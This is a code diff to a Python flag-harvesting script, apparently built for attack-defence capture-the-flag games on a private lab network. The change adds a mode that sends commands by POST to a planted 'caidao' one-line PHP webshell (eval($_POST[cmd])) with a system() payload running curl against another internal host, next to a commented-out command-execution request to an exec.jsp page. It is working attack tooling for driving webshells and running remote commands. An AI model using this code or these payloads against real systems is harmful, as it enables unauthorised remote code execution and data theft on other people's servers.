@@ -6,17 +6,19 @@ import string
 import time
 from datetime import datetime
 '''get flag from host_flags:
-(type,host,url)
+(type,host,url[,payload])
 type:
-    1:simple url(eg:gf.txt or .php)
-    2:exec curl(eg:cmd=curl http://xxxx)
+    1:simple url by get(eg:gf.txt or .php)
+    2:exec curl by get(eg:cmd=curl http://xxxx)
+    3:caidao oneword webshell by post(eg:eval($_POST[cmd]))
 '''
 
 host_flags=(
-    (1,'172.16.5.10:806','/uploadfile/user/b/1/3_1466473584.php'),
-    (1,'172.16.5.10:806','/uploadfile/user/b/1/gf6.txt'),
-    (1,'172.16.5.10:802','/templates/beez_20/gf1.txt')
+    #(1,'172.16.5.10:806','/uploadfile/user/b/1/3_1466473584.php'),
+    #(1,'172.16.5.10:806','/uploadfile/user/b/1/gf6.txt'),
+    #(1,'172.16.5.10:802','/templates/beez_20/gf1.txt')
     #(2,'172.16.8.144:8080','/exec.jsp',{'cmd':'curl -s http://172.16.80.1:8000/flag.txt'})
+    (3,'172.16.80.144','/oneword.php',{'cmd':'system("curl -s http://172.16.80.1:8000/flag.txt");'}),
     )
 
 '''
@@ -45,9 +47,12 @@ def get_flag(flag_log_file):
             host = hf[1]
             url = "http://%s%s"%(host,hf[2])
             try:
-                payload = {} if flag_type == 1 else hf[3]                
-                #send request
-                r = requests.get(url,timeout=5,params=payload,headers=headers)
+                payload = {} if flag_type == 1 else hf[3]         
+                if flag_type == 1 or flag_type == 2:       
+                    #send request
+                    r = requests.get(url,timeout=5,params=payload,headers=headers)
+                elif flag_type == 3:
+                    r = requests.post(url,timeout=5,data=payload,headers=headers)
                 #print flag
                 msg = '[+]%s %s::%s:%s' %(datetime.now().strftime('%H:%M:%S'),host,r.text.strip(),base64decode(r.text.strip()))
                 f.write(msg+'\n')
